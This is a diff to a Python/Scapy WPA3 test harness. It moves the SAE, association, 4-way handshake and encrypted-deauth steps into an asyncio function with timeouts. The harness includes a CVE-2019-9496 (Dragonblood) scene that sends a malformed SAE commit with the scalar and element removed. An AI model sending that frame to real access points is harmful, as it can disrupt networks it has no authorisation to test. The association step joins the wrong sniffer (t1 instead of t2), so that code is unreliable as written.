@@ -2,6 +2,8 @@
 # TODO: Program unit tests so we can easily keep our EAP-pwd code correct
 #!/usr/bin/env python3
 import sys, struct, math, random, time, binascii,logging
+# import timeout_decorator
+import asyncio
 
 from Crypto.Cipher import AES
 from Crypto.Hash import HMAC, SHA256
@@ -392,17 +394,22 @@ class RSN():
         return rsn_info
 
 class eapol_handshake():
-    def __init__(self, DUT_Object, rsn_info):
+    def __init__(self, DUT_Object, rsn_info, timeout=1):
         self.config = DUT_Object
         self.eapol_3_found = False
         self.rsn_info = rsn_info
+        self.timeout = timeout
 
     def run(self):
         # Key (Message 1 of 4)
         logging.info("-------------------------Key (Message 1 of 4): ")
         eapol_p1 = sniff(iface=self.config.iface,
                          lfilter=lambda r: (r.haslayer(EAPOL) and (r.getlayer(WPA_key).key_info  == 0x0088)) ,
-                         count=1, store=1, timeout=2, prn = lambda x: logging.debug(x))
+                         count=1, 
+                         store=1, 
+                         timeout=self.timeout,
+                        #  prn = lambda x: logging.debug(x)
+                         )
         if len(eapol_p1) > 0:
             logging.info("成功捕获到 EAPOL Message 1 of 4 ")
         else:
@@ -451,11 +458,12 @@ class eapol_handshake():
 
         # Key (Message 3 of 4)
         logging.debug("-------------------------Key (Message 3 of 4): ")
-
+        print("timeout : ", self.timeout)
         result = sniff(iface=self.config.iface,
                          lfilter=lambda r: (r.haslayer(EAPOL) and (r.getlayer(WPA_key).key_info  == 0x13c8 )) ,
                          store=1, count=1,
-                         timeout=1)
+                         timeout=self.timeout
+                         )
 
         if len(result) > 0:
             logging.info("成功捕获到 EAPOl Message 3 of 4")
@@ -516,156 +524,24 @@ def test(
     sta_mac = "02:00:00:00:01:00",
     scene   = 2,
     wpa_keyver  = 'WPA2',
-    router_ip   = '192.168.4.1'
+    router_ip   = '192.168.4.1',
+    timeout = 3
 ):
-    conf.iface = iface
-    
-    config = WiFi_Object(
-        iface = iface,
-        ssid = ssid,
-        psk = psk,
-        mac_ap = ap_mac,
-        mac_sta = sta_mac,
-        anonce = "",
-        snonce = "",
-        payload = "",
-    )
-    
-    # logging.debug(config.__dict__)
-    
-    # 探测请求
-    if scene == Scene.probeReq:
-        logging.info(f'Start Probe request.')
-        pr = ProbeReq.gen_Probe_req(ssid=config.ssid, dest_addr=config.mac_ap, source_addr=config.mac_sta)
+    # @timeout_decorator.timeout(timeout)
+    async def create_test_with_timeout(
+        iface   = iface,
+        ssid    = ssid,
+        psk     = psk,
+        ap_mac  = ap_mac,
+        sta_mac = sta_mac,
+        scene   = scene,
+        wpa_keyver  = wpa_keyver,
+        router_ip   = router_ip,
+        timeout = timeout
+    ):
+        conf.iface = iface
         
-        t1 = AsyncSniffer(iface=config.iface,
-                            lfilter=lambda r: (r[Dot11].addr1 == config.mac_sta
-                                                and r.haslayer(Dot11ProbeResp) 
-                                                and r.getlayer(Dot11Elt).info  == config.ssid.encode()
-                                                ) ,
-                            # prn = lambda r: r.summary(),
-                            store=1, 
-                            #  count=1,    # when AsyncSniffer , don't count
-                            timeout=1)
-        t1.start()
-        time.sleep(0.06)
-        sendp(pr, iface=config.iface, verbose=0)
-        result = t1.stop()
-        
-        if len(result) > 0:
-            logging.info(f'Success recv Probe response.')
-            if scene == Scene.probeReq:
-                sys.exit(0)
-        else:
-            logging.error(f'Not found Probe response.')
-            sys.exit(1)
-    
-    # # SAE
-    # 链路认证
-    logging.info("-------------------------SAE Authentication : ")
-    sae = SAEHandshake(password=psk,srcaddr=sta_mac,dstaddr=ap_mac)
-
-    sae_commit_1 = sae.send_commit()
-    t1 = AsyncSniffer(iface=iface, 
-                    lfilter=lambda x: (
-                        x[Dot11].addr1==config.mac_sta 
-                        and x[Dot11].addr2==config.mac_ap 
-                        and x.haslayer(Dot11Auth) 
-                        and x.getlayer(Dot11Auth).seqnum == 1
-                        ),
-                    #   prn=lambda r: logging.debug(fr.summary())
-                    )
-    t1.start()
-    time.sleep(0.1)
-    if scene == Scene.cve_2019_9496:
-        ## dragonblood 漏洞
-        logging.info("-------------------------CVE-2019-9496 : ")
-        sae_tmp = SAE(sae_commit_1[Dot11Auth].payload.build())
-        del sae_tmp[SAE].scalar
-        del sae_tmp[SAE].ffe
-        sae_commit_1[Dot11Auth].payload = sae_tmp
-        scapyconf.iface = iface
-        
-    self_send(RadioTap() / sae_commit_1 ,iface=iface)
-    time.sleep(0.2)
-    
-    try:
-        if scene == Scene.cve_2019_9496:
-            ## dragonblood 漏洞
-            sae_commit_2 = sae_commit_1
-        else:
-            sae_commit_2 = t1.stop()[0]
-    except IndexError:
-        logging.error('Not Found SAE Auth commit response , is AP alive ?')
-        sys.exit(1)
-    
-    # logging.debug(sae_commit_2)
-    
-    if sae_commit_2[Dot11Auth].status != 0x0000:
-        logging.error(f'AP refuse our SAE Commit Request.')
-        sys.exit(1)
-        
-    dot11_sae = SAE(sae_commit_2[Dot11Auth].payload.original)
-    
-    kck, pmk = sae.process_commit(dot11_sae)
-    logging.debug(f"KCK {kck.hex()}")
-    logging.debug(f"PMK {pmk.hex()}")
-    
-    dot11_confirm = sae.send_confirm()
-    self_send(RadioTap()/dot11_confirm, iface=iface)
-    
-    if scene == Scene.cve_2019_9496:
-        logging.info(f'Success scene {scene} : CVE-2019-9496.')
-        sys.exit()
-    
-    if scene == Scene.auth:
-        logging.info(f'Success scene {scene} : SAE Authentication.')
-        sys.exit(0)
-        
-    # 链路关联
-    logging.info("-------------------------Link Assocation : ")
-    # # Association
-    rsn = RSN()
-    rsn_info = rsn.get_rsn_info()
-    packet = Dot11(
-                addr1=ap_mac,
-                addr2=sta_mac,
-                addr3=ap_mac,
-                SC=16)
-    packet /= Dot11AssoReq(
-                            cap='short-slot+ESS+privacy',
-                            listen_interval=0x0001)
-    packet /= Dot11Elt(ID=0, info="{}".format(ssid))
-    packet /=  rsn_info
-    # rate = bytes.fromhex("010882848b960c121824")
-    rate = Dot11EltRates()
-    packet /= rate
-    assocation_1 = RadioTap() / packet
-
-    # sniff 关联响应 association response
-    t2 = AsyncSniffer(iface=config.iface, 
-                    lfilter=lambda x: (
-                                    x[Dot11].addr1==config.mac_sta 
-                                    and x[Dot11].addr2==config.mac_ap 
-                                    and x.haslayer(Dot11AssoResp)
-                                    and x.getlayer(Dot11AssoResp).status == 0x0000
-                                        )
-                    )
-    t2.start()
-    time.sleep(0.1)
-    self_send(assocation_1, iface=iface)
-    time.sleep(0.2)
-    try:
-        result = t2.stop()[0]
-    except IndexError:
-        logging.error('Not Found Association Response .')
-        sys.exit(1)
-
-    if scene == Scene.asso:
-        logging.info(f'Success scene {scene} : Association.')
-        sys.exit(0)
-        
-    config = WiFi_Object(
+        config = WiFi_Object(
             iface = iface,
             ssid = ssid,
             psk = psk,
@@ -673,55 +549,224 @@ def test(
             mac_sta = sta_mac,
             anonce = "",
             snonce = "",
-            payload = (""),
-            kck = kck,
-            pmk = pmk
+            payload = "",
         )
+        
+        # logging.debug(config.__dict__)
+        
+        # 探测请求
+        if scene == Scene.probeReq:
+            logging.info(f'Start Probe request.')
+            pr = ProbeReq.gen_Probe_req(ssid=config.ssid, dest_addr=config.mac_ap, source_addr=config.mac_sta)
+            
+            t1 = AsyncSniffer(iface=config.iface,
+                                lfilter=lambda r: (r[Dot11].addr1 == config.mac_sta
+                                                    and r.haslayer(Dot11ProbeResp) 
+                                                    and r.getlayer(Dot11Elt).info  == config.ssid.encode()
+                                                    ) ,
+                                stop_filter = lambda r: (r[Dot11].addr1 == config.mac_sta
+                                                    and r.haslayer(Dot11ProbeResp) 
+                                                    and r.getlayer(Dot11Elt).info  == config.ssid.encode()
+                                                    ) ,
+                                # prn = lambda r: r.summary(),
+                                store=1, 
+                                #  count=1,    # when AsyncSniffer , don't count
+                                timeout=timeout)
+            t1.start()
+            # time.sleep(0.06)
+            sendp(pr, iface=config.iface, verbose=0)
+            # result = t1.stop()
+            # await asyncio.sleep(0.01)
+            t1.join()
+            result = t1.results[0]
+            
+            if len(result) > 0:
+                logging.info(f'Success recv Probe response.')
+                if scene == Scene.probeReq:
+                    sys.exit(0)
+            else:
+                logging.error(f'Not found Probe response.')
+                sys.exit(1)
+        
+        # # SAE
+        # 链路认证
+        logging.info("-------------------------SAE Authentication : ")
+        sae = SAEHandshake(password=psk,srcaddr=sta_mac,dstaddr=ap_mac)
+
+        sae_commit_1 = sae.send_commit()
+        t1 = AsyncSniffer(iface=iface, 
+                        lfilter=lambda x: (
+                            x[Dot11].addr1==config.mac_sta 
+                            and x[Dot11].addr2==config.mac_ap 
+                            and x.haslayer(Dot11Auth) 
+                            and x.getlayer(Dot11Auth).seqnum == 1
+                            ),
+                        stop_filter=lambda x: (
+                            x[Dot11].addr1==config.mac_sta 
+                            and x[Dot11].addr2==config.mac_ap 
+                            and x.haslayer(Dot11Auth) 
+                            and x.getlayer(Dot11Auth).seqnum == 1
+                            ),
+                        #   prn=lambda r: logging.debug(fr.summary()),
+                        timeout=timeout
+                        )
+        t1.start()
+        # time.sleep(0.1)
+        if scene == Scene.cve_2019_9496:
+            ## dragonblood 漏洞
+            logging.info("-------------------------CVE-2019-9496 : ")
+            sae_tmp = SAE(sae_commit_1[Dot11Auth].payload.build())
+            del sae_tmp[SAE].scalar
+            del sae_tmp[SAE].ffe
+            sae_commit_1[Dot11Auth].payload = sae_tmp
+            scapyconf.iface = iface
+            
+        self_send(RadioTap() / sae_commit_1 ,iface=iface)
+        # time.sleep(0.2)
+        
+        try:
+            if scene == Scene.cve_2019_9496:
+                ## dragonblood 漏洞
+                sae_commit_2 = sae_commit_1
+            else:
+                # sae_commit_2 = t1.stop()[0]
+                t1.join()
+                sae_commit_2 = t1.results[0]
+        except IndexError:
+            logging.error('Not Found SAE Auth commit response , is AP alive ?')
+            sys.exit(1)
+        
+        # logging.debug(sae_commit_2)
+        
+        if sae_commit_2[Dot11Auth].status != 0x0000:
+            logging.error(f'AP refuse our SAE Commit Request.')
+            sys.exit(1)
+            
+        dot11_sae = SAE(sae_commit_2[Dot11Auth].payload.original)
+        
+        kck, pmk = sae.process_commit(dot11_sae)
+        logging.debug(f"KCK {kck.hex()}")
+        logging.debug(f"PMK {pmk.hex()}")
+        
+        dot11_confirm = sae.send_confirm()
+        self_send(RadioTap()/dot11_confirm, iface=iface)
+        
+        if scene == Scene.cve_2019_9496:
+            logging.info(f'Success scene {scene} : CVE-2019-9496.')
+            sys.exit()
+        
+        if scene == Scene.auth:
+            logging.info(f'Success scene {scene} : SAE Authentication.')
+            sys.exit(0)
+            
+        # 链路关联
+        logging.info("-------------------------Link Assocation : ")
+        # # Association
+        rsn = RSN()
+        rsn_info = rsn.get_rsn_info()
+        packet = Dot11(
+                    addr1=ap_mac,
+                    addr2=sta_mac,
+                    addr3=ap_mac,
+                    SC=16)
+        packet /= Dot11AssoReq(
+                                cap='short-slot+ESS+privacy',
+                                listen_interval=0x0001)
+        packet /= Dot11Elt(ID=0, info="{}".format(ssid))
+        packet /=  rsn_info
+        # rate = bytes.fromhex("010882848b960c121824")
+        rate = Dot11EltRates()
+        packet /= rate
+        assocation_1 = RadioTap() / packet
+
+        # sniff 关联响应 association response
+        t2 = AsyncSniffer(iface=config.iface, 
+                        lfilter=lambda x: (
+                                        x[Dot11].addr1==config.mac_sta 
+                                        and x[Dot11].addr2==config.mac_ap 
+                                        and x.haslayer(Dot11AssoResp)
+                                        and x.getlayer(Dot11AssoResp).status == 0x0000
+                                            ),
+                        stop_filter=lambda x: (
+                                        x[Dot11].addr1==config.mac_sta 
+                                        and x[Dot11].addr2==config.mac_ap 
+                                        and x.haslayer(Dot11AssoResp)
+                                        and x.getlayer(Dot11AssoResp).status == 0x0000
+                                            ),
+                        timeout=timeout
+                        )
+        t2.start()
+        # time.sleep(0.1)
+        self_send(assocation_1, iface=iface)
+        # time.sleep(0.2)
+        try:
+            # result = t2.stop()[0]
+            # await asyncio.sleep(1)
+            t1.join()
+            result = t1.results[0]
+        except IndexError:
+            logging.error('Not Found Association Response .')
+            sys.exit(1)
+
+        if scene == Scene.asso:
+            logging.info(f'Success scene {scene} : Association.')
+            sys.exit(0)
+            
+        config = WiFi_Object(
+                iface = iface,
+                ssid = ssid,
+                psk = psk,
+                mac_ap = ap_mac,
+                mac_sta = sta_mac,
+                anonce = "",
+                snonce = "",
+                payload = (""),
+                kck = kck,
+                pmk = pmk
+            )
 
 
-    EAPOL_connect = eapol_handshake(DUT_Object=config, rsn_info=rsn_info)
-    PTK = EAPOL_connect.run()
-    
-    # 断开认证
-    # # WPA3 的 deauth 经过了加密，也就是必须完成完整协商才能 deauth
-    logging.info(f"-------------------------从AP离开: ")
-    TK : bytes = PTK[-16:]
-    Plain_text = bytes(Dot11Deauth(reason=3))
-    # logging.debug(f'TK & Plain_text : {TK.hex(), Plain_text.hex()}')
-    dot11_packet = ( 
-                    Dot11(type=0, subtype=12, FCfield="protected",
-                        addr1=config.mac_ap, 
-                        # addr2=config.mac_sta, 
-                        # addr2='00:00:00:00:00:00', 
-                        addr2='02:00:00:00:00:00', 
-                        # addr3=config.mac_ap
-                        addr3='02:00:00:00:00:00', 
-                        ) / 
-                    Dot11CCMP(ext_iv=1, PN0=4))
-    # logging.debug(f'Dot11 Layer : { bytes(dot11_packet).hex() } ')
-    packet = dot11_packet
-    PN = "{:02x}{:02x}{:02x}{:02x}{:02x}{:02x}".format(packet.PN5,packet.PN4,packet.PN3,packet.PN2,packet.PN1,packet.PN0)
-    Nonce = CCMPCrypto.ccmp_get_nonce(priority='10', addr=config.mac_sta,pn=PN)
-    cipher = AES.new(TK, AES.MODE_CCM, Nonce, mac_len = 8)
-    deauth_cipher = cipher.encrypt(Plain_text)
-    # logging.debug(f"deauth_cipher : { deauth_cipher.hex()}")
-    aad = CCMPCrypto.ccmp_get_aad(dot11_packet, amsdu_spp=False)
-    MIC = CCMPCrypto.cbc_mac(TK, Plain_text, aad, Nonce)
-    # logging.debug(f"Deauth MIC : { MIC.hex()}")
-    wpa3_deauth = ( 
-                    RadioTap() / 
-                    dot11_packet / 
-                    Raw(deauth_cipher) / 
-                    Raw(MIC)
-                    )
-    if self_send(wpa3_deauth, iface = config.iface):
+        EAPOL_connect = eapol_handshake(DUT_Object=config, rsn_info=rsn_info, timeout=timeout)
+        PTK = EAPOL_connect.run()
+        
+        # 断开认证
+        # # WPA3 的 deauth 经过了加密，也就是必须完成完整协商才能 deauth
+        logging.info(f"-------------------------从AP离开: ")
+        TK : bytes = PTK[-16:]
+        Plain_text = bytes(Dot11Deauth(reason=3))
+        # logging.debug(f'TK & Plain_text : {TK.hex(), Plain_text.hex()}')
+        dot11_packet = ( 
+                        Dot11(type=0, subtype=12, FCfield="protected",
+                            addr1=config.mac_ap, 
+                            addr2=config.mac_sta, 
+                            addr3=config.mac_ap
+                            ) / 
+                        Dot11CCMP(ext_iv=1, PN0=4))
+        # logging.debug(f'Dot11 Layer : { bytes(dot11_packet).hex() } ')
+        packet = dot11_packet
+        PN = "{:02x}{:02x}{:02x}{:02x}{:02x}{:02x}".format(packet.PN5,packet.PN4,packet.PN3,packet.PN2,packet.PN1,packet.PN0)
+        Nonce = CCMPCrypto.ccmp_get_nonce(priority='10', addr=config.mac_sta,pn=PN)
+        cipher = AES.new(TK, AES.MODE_CCM, Nonce, mac_len = 8)
+        deauth_cipher = cipher.encrypt(Plain_text)
+        # logging.debug(f"deauth_cipher : { deauth_cipher.hex()}")
+        aad = CCMPCrypto.ccmp_get_aad(dot11_packet, amsdu_spp=False)
+        MIC = CCMPCrypto.cbc_mac(TK, Plain_text, aad, Nonce)
+        # logging.debug(f"Deauth MIC : { MIC.hex()}")
+        wpa3_deauth = ( 
+                        RadioTap() / 
+                        dot11_packet / 
+                        Raw(deauth_cipher) / 
+                        Raw(MIC)
+                        )
+        self_send(wpa3_deauth, iface = config.iface)
         logging.info(f'Deauth done.')
-    if scene == Scene.four_way_handshake:
-        logging.info(f'Success scene {scene} : 4_way_handshake.')
-        sys.exit(0)
+        if scene == Scene.four_way_handshake:
+            logging.info(f'Success scene {scene} : 4_way_handshake.')
+            sys.exit(0)
 
-    return
+        return
 
+    asyncio.run(create_test_with_timeout())
 
 if __name__ == "__main__":
     test()
